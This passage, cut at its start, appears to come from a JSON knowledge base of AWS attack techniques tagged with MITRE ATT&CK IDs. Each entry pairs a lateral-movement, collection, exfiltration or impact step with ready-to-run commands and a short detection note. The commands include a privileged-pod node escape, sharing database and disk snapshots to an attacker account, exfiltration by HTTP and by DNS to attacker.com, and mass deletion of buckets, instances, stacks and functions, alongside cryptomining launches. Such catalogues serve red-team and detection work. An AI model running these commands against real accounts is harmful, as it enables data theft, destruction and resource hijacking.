      "next_techniques": ["AWS-LATERAL-002", "AWS-CRED-004"],
      "risk_level": "low"
    },
    {
      "id": "AWS-LATERAL-001",
      "mitre_id": "T1021.007",
      "name": "EC2 Instance Connect",
      "phase": "lateral_movement",
      "infrastructure": "aws",
      "description": "Use EC2 Instance Connect or SSM Session Manager to access other instances",
      "prerequisites": ["EC2 Instance Connect or SSM permissions"],
      "tools": ["AWS CLI", "SSM Session Manager"],
      "commands": [
        "# Push SSH key via Instance Connect\naws ec2-instance-connect send-ssh-public-key --instance-id i-12345 --instance-os-user ec2-user --ssh-public-key file://~/.ssh/id_rsa.pub\nssh ec2-user@<instance-ip>",
        "# Start SSM session\naws ssm start-session --target i-1234567890abcdef0",
        "# Port forwarding via SSM\naws ssm start-session --target i-12345 --document-name AWS-StartPortForwardingSession --parameters '{\"portNumber\":[\"3389\"],\"localPortNumber\":[\"13389\"]}'",
        "# SSH via SSM\nssh -o ProxyCommand='aws ssm start-session --target %h --document-name AWS-StartSSHSession' ec2-user@i-12345"
      ],
      "detection": "CloudTrail SendSSHPublicKey, StartSession events",
      "references": ["https://attack.mitre.org/techniques/T1021/007/"],
      "next_techniques": ["AWS-CRED-001", "AWS-COLL-001"],
      "risk_level": "medium"
    },
    {
      "id": "AWS-LATERAL-002",
      "mitre_id": "T1021",
      "name": "EKS Pod-to-Pod Movement",
      "phase": "lateral_movement",
      "infrastructure": "aws",
      "description": "Move laterally between pods in EKS cluster using compromised credentials",
      "prerequisites": ["Access to EKS pod", "Network access to other pods"],
      "tools": ["kubectl", "Custom scripts"],
      "commands": [
        "# List pods in all namespaces\nkubectl get pods --all-namespaces -o wide",
        "# Exec into another pod\nkubectl exec -it <pod-name> -n <namespace> -- /bin/bash",
        "# Port forward to pod\nkubectl port-forward <pod-name> 8080:80",
        "# Create privileged pod\nkubectl run pwned --image=alpine --restart=Never --overrides='{\"spec\":{\"hostNetwork\":true,\"hostPID\":true,\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"bash\"],\"securityContext\":{\"privileged\":true}}]}}'",
        "# Access node from privileged pod\nnsenter --target 1 --mount --uts --ipc --net --pid -- bash"
      ],
      "detection": "EKS audit logs, network policies",
      "references": ["https://attack.mitre.org/techniques/T1021/"],
      "next_techniques": ["AWS-CRED-004"],
      "risk_level": "high"
    },
    {
      "id": "AWS-LATERAL-003",
      "mitre_id": "T1550.001",
      "name": "Cross-Account Access",
      "phase": "lateral_movement",
      "infrastructure": "aws",
      "description": "Move to other AWS accounts using assumed roles or shared resources",
      "prerequisites": ["Cross-account role assumption permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List organizations accounts (if org access)\naws organizations list-accounts",
        "# Assume role in another account\naws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<ROLE> --role-session-name lateral",
        "# Access shared S3 bucket\naws s3 ls s3://shared-bucket/",
        "# Access shared RDS snapshot\naws rds describe-db-snapshots --include-shared",
        "# Access shared AMI\naws ec2 describe-images --executable-users self"
      ],
      "detection": "CloudTrail AssumeRole events, cross-account API calls",
      "references": ["https://attack.mitre.org/techniques/T1550/001/"],
      "next_techniques": ["AWS-RECON-001"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-COLL-001",
      "mitre_id": "T1530",
      "name": "S3 Data Collection",
      "phase": "collection",
      "infrastructure": "aws",
      "description": "Access and download sensitive data from S3 buckets",
      "prerequisites": ["S3 read permissions or public bucket"],
      "tools": ["AWS CLI", "S3Scanner", "Custom scripts"],
      "commands": [
        "# List all buckets\naws s3 ls",
        "# List bucket contents\naws s3 ls s3://<bucket-name> --recursive",
        "# Download entire bucket\naws s3 sync s3://<bucket-name> ./loot/",
        "# Download specific files\naws s3 cp s3://<bucket>/sensitive.db ./",
        "# Search for sensitive files\naws s3 ls s3://<bucket> --recursive | grep -E '\\.(sql|csv|xlsx|json|env|config|key|pem)$'",
        "# Access public bucket (no auth)\ncurl https://<bucket>.s3.amazonaws.com/\naws s3 ls s3://<bucket> --no-sign-request"
      ],
      "detection": "S3 access logs, CloudTrail S3 data events",
      "references": ["https://attack.mitre.org/techniques/T1530/"],
      "next_techniques": ["AWS-EXFIL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-COLL-002",
      "mitre_id": "T1530",
      "name": "RDS Snapshot Access",
      "phase": "collection",
      "infrastructure": "aws",
      "description": "Access RDS snapshots or create snapshots to extract database contents",
      "prerequisites": ["RDS snapshot permissions"],
      "tools": ["AWS CLI", "Database clients"],
      "commands": [
        "# List RDS snapshots\naws rds describe-db-snapshots",
        "# Create snapshot of database\naws rds create-db-snapshot --db-instance-identifier <db> --db-snapshot-identifier loot-snapshot",
        "# Share snapshot with attacker account\naws rds modify-db-snapshot-attribute --db-snapshot-identifier loot-snapshot --attribute-name restore --values-to-add <ATTACKER_ACCOUNT_ID>",
        "# Restore snapshot in attacker account\naws rds restore-db-instance-from-db-snapshot --db-instance-identifier stolen-db --db-snapshot-identifier arn:aws:rds:...",
        "# Connect to restored database\nmysql -h <endpoint> -u admin -p\npg_dump -h <endpoint> -U admin database > dump.sql"
      ],
      "detection": "CloudTrail CreateDBSnapshot, RestoreDBInstanceFromDBSnapshot events",
      "references": ["https://attack.mitre.org/techniques/T1530/"],
      "next_techniques": ["AWS-EXFIL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-COLL-003",
      "mitre_id": "T1530",
      "name": "EBS Snapshot Extraction",
      "phase": "collection",
      "infrastructure": "aws",
      "description": "Create or access EBS snapshots to extract sensitive data from volumes",
      "prerequisites": ["EBS snapshot permissions"],
      "tools": ["AWS CLI", "Custom scripts"],
      "commands": [
        "# List EBS snapshots\naws ec2 describe-snapshots --owner-ids self",
        "# Create snapshot of volume\naws ec2 create-snapshot --volume-id vol-12345 --description 'backup'",
        "# Share snapshot with attacker account\naws ec2 modify-snapshot-attribute --snapshot-id snap-12345 --attribute createVolumePermission --operation-type add --user-ids <ATTACKER_ACCOUNT>",
        "# In attacker account, create volume from snapshot\naws ec2 create-volume --snapshot-id snap-12345 --availability-zone us-east-1a",
        "# Attach and mount for extraction\naws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/sdf\nsudo mount /dev/xvdf1 /mnt/stolen"
      ],
      "detection": "CloudTrail CreateSnapshot events, snapshot sharing",
      "references": ["https://attack.mitre.org/techniques/T1530/"],
      "next_techniques": ["AWS-EXFIL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-EXFIL-001",
      "mitre_id": "T1537",
      "name": "S3 Bucket Exfiltration",
      "phase": "exfiltration",
      "infrastructure": "aws",
      "description": "Exfiltrate data by copying to attacker-controlled S3 bucket or public bucket",
      "prerequisites": ["S3 read access", "Internet access"],
      "tools": ["AWS CLI", "s3cmd"],
      "commands": [
        "# Copy to attacker bucket\naws s3 sync s3://victim-bucket s3://attacker-bucket --source-region us-east-1 --region eu-west-1",
        "# Make bucket public for exfil\naws s3api put-bucket-acl --bucket exfil-bucket --acl public-read",
        "# Upload data to attacker bucket\naws s3 cp sensitive-data.tar.gz s3://attacker-bucket/",
        "# Use presigned URL for exfil\naws s3 presign s3://bucket/sensitive.db --expires-in 3600"
      ],
      "detection": "S3 access logs, VPC Flow Logs, data transfer monitoring",
      "references": ["https://attack.mitre.org/techniques/T1537/"],
      "next_techniques": [],
      "risk_level": "high"
    },
    {
      "id": "AWS-EXFIL-002",
      "mitre_id": "T1567.002",
      "name": "Exfiltration to Cloud Storage",
      "phase": "exfiltration",
      "infrastructure": "aws",
      "description": "Transfer data to external cloud storage services bypassing network controls",
      "prerequisites": ["Internet access", "External cloud account"],
      "tools": ["AWS CLI", "rclone", "Custom scripts"],
      "commands": [
        "# Configure rclone for exfil\nrclone config\nrclone copy /data remote:exfil-bucket",
        "# Exfil via Lambda to external API\nimport urllib.request\nurllib.request.urlopen(urllib.request.Request('https://attacker.com/exfil', data=sensitive_data.encode()))",
        "# DNS exfil\nfor chunk in $(cat data | base64 | fold -w 60); do\n  nslookup $chunk.attacker.com\ndone"
      ],
      "detection": "VPC Flow Logs, DLP solutions",
      "references": ["https://attack.mitre.org/techniques/T1567/002/"],
      "next_techniques": [],
      "risk_level": "high"
    },
    {
      "id": "AWS-IMPACT-001",
      "mitre_id": "T1485",
      "name": "S3 Data Destruction",
      "phase": "impact",
      "infrastructure": "aws",
      "description": "Delete or encrypt S3 bucket contents for ransomware or destruction",
      "prerequisites": ["S3 delete permissions"],
      "tools": ["AWS CLI", "Custom ransomware"],
      "commands": [
        "# Delete all objects in bucket\naws s3 rm s3://<bucket> --recursive",
        "# Delete bucket versions (if versioned)\naws s3api delete-objects --bucket <bucket> --delete \"$(aws s3api list-object-versions --bucket <bucket> --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}')\""
      ],
      "detection": "CloudTrail DeleteObject events, S3 versioning",
      "references": ["https://attack.mitre.org/techniques/T1485/"],
      "next_techniques": [],
      "risk_level": "critical"
    },
    {
      "id": "AWS-IMPACT-002",
      "mitre_id": "T1496",
      "name": "Cryptomining Resource Hijacking",
      "phase": "impact",
      "infrastructure": "aws",
      "description": "Launch EC2 instances or containers for cryptocurrency mining",
      "prerequisites": ["EC2 run instances permissions"],
      "tools": ["Mining software", "AWS CLI"],
      "commands": [
        "# Launch large instances for mining\naws ec2 run-instances --image-id ami-mining --instance-type p3.16xlarge --count 10 --user-data file://mining-setup.sh",
        "# Run mining container in ECS\naws ecs run-task --cluster <cluster> --task-definition mining-task",
        "# Spot instances for cheaper mining\naws ec2 request-spot-instances --instance-count 20 --type persistent --launch-specification file://mining-spec.json"
      ],
      "detection": "Billing alerts, GuardDuty CryptoCurrency findings",
      "references": ["https://attack.mitre.org/techniques/T1496/"],
      "next_techniques": [],
      "risk_level": "high"
    },
    {
      "id": "AWS-IMPACT-003",
      "mitre_id": "T1489",
      "name": "Service Disruption",
      "phase": "impact",
      "infrastructure": "aws",
      "description": "Terminate EC2 instances, delete resources, or modify configurations to cause outage",
      "prerequisites": ["Resource termination/modification permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# Terminate all EC2 instances\naws ec2 terminate-instances --instance-ids $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text)",
        "# Delete CloudFormation stacks\nfor stack in $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query 'StackSummaries[].StackName' --output text); do\n  aws cloudformation delete-stack --stack-name $stack\ndone",
        "# Delete Lambda functions\nfor func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do\n  aws lambda delete-function --function-name $func\ndone"
      ],
      "detection": "CloudTrail TerminateInstances, DeleteStack events",
      "references": ["https://attack.mitre.org/techniques/T1489/"],
      "next_techniques": [],
      "risk_level": "critical"
    }
  ]
}
